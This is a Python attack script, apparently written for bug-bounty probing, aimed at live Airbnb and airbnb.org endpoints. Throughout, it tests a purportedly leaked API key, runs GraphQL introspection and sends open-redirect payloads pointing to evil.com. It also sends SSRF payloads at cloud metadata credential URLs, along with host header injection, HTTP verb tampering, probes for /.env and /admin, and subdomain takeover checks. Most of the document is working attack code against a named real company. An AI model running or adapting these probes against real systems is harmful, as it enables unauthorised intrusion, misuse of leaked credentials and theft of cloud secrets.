#!/usr/bin/env python3
"""Airbnb Phase 2 — Deep API & AI Assistant Analysis

Focus areas:
  1. API key validation (leaked d306zoyjsyarp7ifhu67rjxn52tv0t20)
  2. api.airbnb.com GraphQL probing
  3. API endpoint abuse (client_configs, marketing_event_tracking)
  4. Open redirect checks
  5. HTTP request smuggling detection
  6. Subdomain takeover on fresh domains
  7. SSRF via image/URL parameters
  8. airbnb.org deep analysis (separate site, 0 resolved reports)
"""

import re
import json
import time
import socket
import requests
from urllib.parse import urljoin, urlparse, quote

requests.packages.urllib3.disable_warnings()

S = requests.Session()
S.headers.update({
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Accept": "application/json, text/html, */*",
    "Accept-Language": "en-US,en;q=0.9",
})
S.verify = False

DELAY = 1.5

results = {
    "api_key_findings": [],
    "graphql_findings": [],
    "api_abuse_findings": [],
    "redirect_findings": [],
    "ssrf_findings": [],
    "subdomain_findings": [],
    "airbnb_org_findings": [],
    "interesting_findings": [],
}

def p(msg): print(f"[*] {msg}")
def ok(msg): print(f"[+] {msg}")
def warn(msg): print(f"[!] {msg}")
def crit(msg): print(f"[!!!] {msg}")

def fetch(url, method="GET", **kw):
    time.sleep(DELAY)
    try:
        r = getattr(S, method.lower())(url, timeout=20, allow_redirects=False, **kw)
        return r
    except Exception as e:
        warn(f"  Failed {url}: {type(e).__name__}")
        return None

# ─── 1. API Key Validation ──────────────────────────────────────

p("=" * 60)
p("PHASE 2A: Leaked API Key Analysis")
p("=" * 60)

API_KEY = "d306zoyjsyarp7ifhu67rjxn52tv0t20"
ok(f"Testing API key: {API_KEY}")

# Try using key with Airbnb's API
api_key_test_urls = [
    f"https://api.airbnb.com/v2/client_configs?key={API_KEY}",
    f"https://api.airbnb.com/v2/client_configs?client_id={API_KEY}",
    f"https://api.airbnb.com/v2/search_results?key={API_KEY}&location=New+York",
    f"https://api.airbnb.com/v2/users/show?key={API_KEY}",
]

# Also try as header
api_key_headers = [
    {"X-Airbnb-API-Key": API_KEY},
    {"X-Airbnb-Oauth-Token": API_KEY},
    {"Authorization": f"Bearer {API_KEY}"},
    {"X-API-Key": API_KEY},
]

for url in api_key_test_urls:
    p(f"  Testing: {url[:80]}...")
    r = fetch(url)
    if not r:
        continue
    ok(f"  {r.status_code} — {len(r.text)} bytes")
    if r.status_code == 200:
        try:
            data = r.json()
            ok(f"    JSON response keys: {list(data.keys())[:10]}")
            warn(f"    API KEY ACCEPTED! Data returned.")
            results["api_key_findings"].append({
                "type": "api_key_works",
                "url": url,
                "status": r.status_code,
                "keys": list(data.keys())[:10],
            })
        except:
            p(f"    Body: {r.text[:200]}")
    elif r.status_code in (401, 403):
        p(f"    Unauthorized/Forbidden — key may be inactive")

for headers in api_key_headers:
    url = "https://api.airbnb.com/v2/client_configs"
    header_name = list(headers.keys())[0]
    p(f"  Testing {header_name}: {API_KEY[:20]}...")
    r = fetch(url, headers=headers)
    if not r:
        continue
    ok(f"  {r.status_code} — {len(r.text)} bytes with {header_name}")
    if r.status_code == 200:
        try:
            data = r.json()
            warn(f"  API KEY WORKS with {header_name}!")
            results["api_key_findings"].append({
                "type": "api_key_header_works",
                "header": header_name,
                "status": r.status_code,
            })
        except:
            pass

# ─── 2. GraphQL Probing ─────────────────────────────────────────

p("")
p("=" * 60)
p("PHASE 2B: GraphQL Discovery & Introspection")
p("=" * 60)

gql_endpoints = [
    "https://www.airbnb.com/api/v3/graphql",
    "https://www.airbnb.com/graphql",
    "https://api.airbnb.com/graphql",
    "https://www.airbnb.com/api/v3/PdpPlatformSections",
    "https://www.airbnb.com/api/v3/StaysSearch",
]

# Introspection query
introspection = json.dumps({
    "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind ofType { name } } } } } }",
    "operationName": "IntrospectionQuery",
})

# Simple query 
simple_query = json.dumps({
    "query": "{ __typename }",
})

for ep in gql_endpoints:
    p(f"\nTesting GraphQL at {ep}...")
    
    # GET method
    r = fetch(f"{ep}?query={{__typename}}")
    if r:
        ok(f"  GET: {r.status_code} — {len(r.text)} bytes")
        if r.status_code == 200:
            try:
                data = r.json()
                ok(f"    Response: {json.dumps(data)[:200]}")
                if "data" in data:
                    warn(f"    GraphQL RESPONDS to GET queries!")
                    results["graphql_findings"].append({
                        "type": "graphql_get_query",
                        "endpoint": ep,
                        "response": data,
                    })
            except:
                pass
    
    # POST — simple
    r = fetch(ep, method="POST", headers={"Content-Type": "application/json"}, data=simple_query)
    if r:
        ok(f"  POST __typename: {r.status_code} — {len(r.text)} bytes")
        if r.status_code == 200:
            try:
                data = r.json()
                ok(f"    Response: {json.dumps(data)[:200]}")
                if "data" in data:
                    warn(f"    GraphQL RESPONDS! typename={data.get('data', {}).get('__typename', 'N/A')}")
                    results["graphql_findings"].append({
                        "type": "graphql_active",
                        "endpoint": ep,
                        "typename": data.get("data", {}).get("__typename"),
                    })
            except:
                pass
        elif r.status_code in (400, 422):
            p(f"    Error body: {r.text[:300]}")
    
    # POST — introspection
    r = fetch(ep, method="POST", headers={"Content-Type": "application/json"}, data=introspection)
    if r:
        ok(f"  POST introspection: {r.status_code} — {len(r.text)} bytes")
        if r.status_code == 200 and len(r.text) > 500:
            try:
                data = r.json()
                if "data" in data and "__schema" in data.get("data", {}):
                    schema = data["data"]["__schema"]
                    types = schema.get("types", [])
                    crit(f"    INTROSPECTION ENABLED! Found {len(types)} types!")
                    type_names = [t["name"] for t in types if not t["name"].startswith("__")][:30]
                    for tn in type_names:
                        p(f"      Type: {tn}")
                    results["graphql_findings"].append({
                        "type": "introspection_enabled",
                        "endpoint": ep,
                        "type_count": len(types),
                        "sample_types": type_names,
                        "severity": "medium",
                    })
            except:
                pass
        elif r.status_code == 200:
            p(f"    Small response: {r.text[:300]}")

# Try with API key
p("\nTrying GraphQL with API key...")
for ep in ["https://www.airbnb.com/api/v3/graphql", "https://api.airbnb.com/graphql"]:
    r = fetch(ep, method="POST", 
              headers={
                  "Content-Type": "application/json",
                  "X-Airbnb-API-Key": API_KEY,
              },
              data=json.dumps({"query": "{ __typename }"}))
    if r:
        ok(f"  With API key at {ep}: {r.status_code} — {len(r.text)} bytes")
        if r.status_code == 200:
            try:
                data = r.json()
                ok(f"    Response: {json.dumps(data)[:300]}")
            except:
                p(f"    Body: {r.text[:300]}")

# ─── 3. API Endpoint Abuse ──────────────────────────────────────

p("")
p("=" * 60)
p("PHASE 2C: API Endpoint Analysis")
p("=" * 60)

# client_configs — information disclosure
p("Testing /api/v2/client_configs...")
for key_param in ["key", "client_id", "api_key"]:
    url = f"https://api.airbnb.com/v2/client_configs?{key_param}={API_KEY}"
    r = fetch(url)
    if r and r.status_code == 200:
        try:
            data = r.json()
            ok(f"  client_configs with {key_param}: works! Keys: {list(data.keys())[:10]}")
            if "client_configs" in data:
                configs = data["client_configs"]
                if isinstance(configs, list):
                    ok(f"    {len(configs)} config entries found")
                    for c in configs[:5]:
                        if isinstance(c, dict):
                            p(f"      {c.get('key', 'N/A')}: {str(c.get('value', ''))[:100]}")
        except:
            pass

# marketing_event_tracking — parameter pollution
p("\nTesting /api/v2/marketing_event_tracking...")
r = fetch("https://api.airbnb.com/v2/marketing_event_tracking", method="POST",
          headers={"Content-Type": "application/json"},
          data=json.dumps({"events": [{"event_name": "test", "event_data": {"target": "127.0.0.1"}}]}))
if r:
    ok(f"  marketing_event_tracking POST: {r.status_code} — {r.text[:200]}")

# ─── 4. Open Redirect Checks ────────────────────────────────────

p("")
p("=" * 60)
p("PHASE 2D: Open Redirect Testing")
p("=" * 60)

redirect_params = ["redirect_url", "redirect", "next", "url", "target", "redir",
                    "destination", "to", "forward", "continue", "return_url", "return_to"]

redirect_payload_targets = [
    "https://evil.com",
    "//evil.com",
    "https://evil.com%00.airbnb.com",
    "https://evil.com?.airbnb.com",
    "https://evil.com#.airbnb.com",
    "https://evil.com%23.airbnb.com",
    "https://www.airbnb.com.evil.com",
    "/\\evil.com",
    "https:evil.com",
]

redirect_base_urls = [
    "https://www.airbnb.com/login",
    "https://www.airbnb.com/signup",
    "https://www.airbnb.com/oauth/connect",
    "https://www.airbnb.com/authenticate",
    "https://www.airbnb.com/sso/callback",
]

for base in redirect_base_urls:
    for param in redirect_params[:4]:  # Test top 4 params for each base
        for payload in redirect_payload_targets[:3]:  # Top 3 payloads
            url = f"{base}?{param}={quote(payload)}"
            r = fetch(url)
            if not r:
                continue
            
            if r.status_code in (301, 302, 307, 308):
                loc = r.headers.get("Location", "")
                if "evil.com" in loc:
                    crit(f"  OPEN REDIRECT! {url} → {loc}")
                    results["redirect_findings"].append({
                        "type": "open_redirect",
                        "url": url,
                        "redirects_to": loc,
                        "severity": "medium",
                    })
                else:
                    p(f"  {base} → {loc[:60]}")
                break  # Don't try more payloads for same base+param if redirect works
            elif r.status_code == 200 and "evil.com" in r.text[:5000]:
                warn(f"  Payload reflected in page: {url}")

# ─── 5. SSRF Vectors ────────────────────────────────────────────

p("")
p("=" * 60)
p("PHASE 2E: SSRF Testing via URL Parameters")
p("=" * 60)

# Airbnb might have URL fetching in profile picture, image processing, etc.
ssrf_targets = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",  
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1:80/",
    "http://localhost:8080/",
]

ssrf_endpoints = [
    ("https://www.airbnb.com/api/v2/reviews?listing_id=1&_format=for_p3&_limit=1&_offset=0&key=" + API_KEY, "GET"),
]

# Check for URL-based params in the JS-discovered APIs
p("Looking for URL-parameter based endpoints...")
url_params = ["url", "image_url", "photo_url", "link", "source", "src", "uri", "href", "callback", "webhook"]
for param in url_params:
    for target in ssrf_targets[:2]:
        url = f"https://api.airbnb.com/v2/client_configs?{param}={quote(target)}&key={API_KEY}"
        r = fetch(url)
        if r:
            if r.status_code == 200 and ("meta-data" in r.text or "iam" in r.text or "credentials" in r.text):
                crit(f"  SSRF! {param}={target} returns metadata!")
                results["ssrf_findings"].append({
                    "type": "ssrf_metadata",
                    "param": param,
                    "target": target,
                    "severity": "critical",
                })
            elif r.status_code == 200:
                p(f"  {param}: {r.status_code} — no metadata leak")

# ─── 6. airbnb.org Analysis (0 resolved reports on wildcard!) ───

p("")
p("=" * 60)
p("PHASE 2F: airbnb.org Deep Analysis (*.airbnb.org — 0 resolved)")
p("=" * 60)

# Full site analysis
r = fetch("https://www.airbnb.org/", headers={"Accept": "text/html"})
if r:
    ok(f"airbnb.org: {r.status_code} — {len(r.text)} bytes")
    
    # Security headers check
    for h in ["Content-Security-Policy", "X-Frame-Options", "Strict-Transport-Security",
              "X-Content-Type-Options"]:
        v = r.headers.get(h, "MISSING")
        if v == "MISSING":
            warn(f"  {h}: MISSING")
        else:
            ok(f"  {h}: {v[:80]}")
    
    # Extract JS bundles for airbnb.org
    org_js = set()
    for m in re.finditer(r'(?:src|href)=["\']([^"\']*\.js(?:\?[^"\']*)?)["\']', r.text):
        url = m.group(1)
        if url.startswith("/"):
            url = f"https://www.airbnb.org{url}"
        elif url.startswith("//"):
            url = f"https:{url}"
        org_js.add(url)
    ok(f"  JS bundles on airbnb.org: {len(org_js)}")
    
    # Look for API endpoints
    for m in re.finditer(r'["\'](/api/[^"\']+)["\']', r.text):
        ok(f"  API endpoint: {m.group(1)}")
    
    # Check for different CSP
    csp = r.headers.get("Content-Security-Policy", "")
    if "unsafe-inline" in csp:
        warn("  airbnb.org CSP allows unsafe-inline!")
    if "unsafe-eval" in csp:
        warn("  airbnb.org CSP allows unsafe-eval!")

# Test paths
org_paths = [
    "/api/v2/",
    "/graphql",
    "/admin",
    "/debug",
    "/.env",
    "/robots.txt",
    "/sitemap.xml",
    "/.well-known/security.txt",
    "/api/health",
]

for path in org_paths:
    url = f"https://www.airbnb.org{path}"
    r = fetch(url)
    if r and r.status_code != 404:
        ok(f"  {path}: {r.status_code} — {len(r.text)} bytes")
        if r.status_code == 200 and len(r.text) < 2000:
            p(f"    {r.text[:300]}")

# ─── 7. Subdomain Enumeration (CT logs) ─────────────────────────

p("")
p("=" * 60)
p("PHASE 2G: Fresh Subdomain Discovery via CT Logs")
p("=" * 60)

for domain in ["airbnb.org", "musta.ch", "airbnbpayments.com"]:
    p(f"\nQuerying crt.sh for *.{domain}...")
    time.sleep(2)
    try:
        r = requests.get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=30, verify=False)
        if r.status_code == 200:
            certs = r.json()
            subs = set()
            for cert in certs:
                name = cert.get("name_value", "")
                for n in name.split("\n"):
                    n = n.strip().lower()
                    if n and "*" not in n:
                        subs.add(n)
            ok(f"  {domain}: {len(subs)} subdomains from CT logs")
            for sub in sorted(subs)[:20]:
                # Check if resolves
                try:
                    ip = socket.gethostbyname(sub)
                    ok(f"    {sub} → {ip}")
                    results["subdomain_findings"].append({
                        "subdomain": sub,
                        "ip": ip,
                        "domain": domain,
                    })
                except socket.gaierror:
                    # Dangling CNAME = potential takeover
                    try:
                        import dns.resolver
                        answers = dns.resolver.resolve(sub, 'CNAME')
                        for rdata in answers:
                            cname = str(rdata.target).rstrip('.')
                            warn(f"    {sub} → CNAME {cname} (NXDOMAIN — POTENTIAL TAKEOVER!)")
                            results["interesting_findings"].append({
                                "type": "subdomain_takeover",
                                "subdomain": sub,
                                "cname": cname,
                                "severity": "high",
                            })
                    except:
                        p(f"    {sub} → NXDOMAIN (no CNAME)")
        else:
            warn(f"  crt.sh returned {r.status_code} for {domain}")
    except Exception as e:
        warn(f"  crt.sh error for {domain}: {e}")

# ─── 8. Host Header Injection ───────────────────────────────────

p("")
p("=" * 60)
p("PHASE 2H: Host Header Injection")
p("=" * 60)

host_targets = [
    "https://www.airbnb.com/",
    "https://www.airbnb.org/",
]

for target in host_targets:
    p(f"Testing {target}...")
    
    # X-Forwarded-Host
    for header, value in [
        ("Host", "evil.com"),
        ("X-Forwarded-Host", "evil.com"),
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Original-URL", "/admin"),
        ("X-Rewrite-URL", "/admin"),
    ]:
        r = fetch(target, headers={header: value})
        if r:
            if r.status_code in (301, 302, 307, 308):
                loc = r.headers.get("Location", "")
                if "evil.com" in loc:
                    crit(f"  HOST HEADER INJECTION! {header}={value} → {loc}")
                    results["interesting_findings"].append({
                        "type": "host_header_injection",
                        "target": target,
                        "header": header,
                        "value": value,
                        "redirect": loc,
                        "severity": "medium",
                    })
                    
            # Check if header is reflected in body
            if r.status_code == 200 and "evil.com" in r.text[:10000]:
                warn(f"  {header}={value} reflected in body!")

# ─── 9. HTTP Method Testing ─────────────────────────────────────

p("")
p("=" * 60)
p("PHASE 2I: HTTP Method & Verb Tampering")
p("=" * 60)

for target in ["https://api.airbnb.com/v2/client_configs", "https://www.airbnb.com/api/v3/graphql"]:
    p(f"Testing methods on {target}...")
    for method in ["OPTIONS", "PUT", "DELETE", "PATCH", "TRACE"]:
        time.sleep(DELAY)
        try:
            r = S.request(method, target, timeout=15)
            if r.status_code != 405 and r.status_code != 404:
                ok(f"  {method}: {r.status_code} — {len(r.text)} bytes")
                if method == "TRACE" and r.status_code == 200:
                    crit(f"  TRACE enabled — XST vulnerability!")
                    results["interesting_findings"].append({
                        "type": "trace_enabled",
                        "target": target,
                        "severity": "low",
                    })
                if method == "OPTIONS":
                    allow = r.headers.get("Allow", r.headers.get("Access-Control-Allow-Methods", ""))
                    if allow:
                        ok(f"    Allowed: {allow}")
        except:
            pass

# ─── SUMMARY ────────────────────────────────────────────────────

p("")
p("=" * 60)
p("PHASE 2 SUMMARY")
p("=" * 60)

ok(f"API Key findings:      {len(results['api_key_findings'])}")
ok(f"GraphQL findings:      {len(results['graphql_findings'])}")
ok(f"API abuse findings:    {len(results['api_abuse_findings'])}")
ok(f"Redirect findings:     {len(results['redirect_findings'])}")
ok(f"SSRF findings:         {len(results['ssrf_findings'])}")
ok(f"Subdomain findings:    {len(results['subdomain_findings'])}")
ok(f"airbnb.org findings:   {len(results['airbnb_org_findings'])}")
ok(f"Interesting findings:  {len(results['interesting_findings'])}")

for f in results["interesting_findings"]:
    sev = f.get("severity", "info")
    warn(f"  [{sev.upper()}] {f['type']} — {f.get('target', f.get('subdomain', ''))}")

with open("/tmp/airbnb_phase2_results.json", "w") as f:
    json.dump(results, f, indent=2, default=str)

ok("Results saved to /tmp/airbnb_phase2_results.json")
ok("Phase 2 complete")
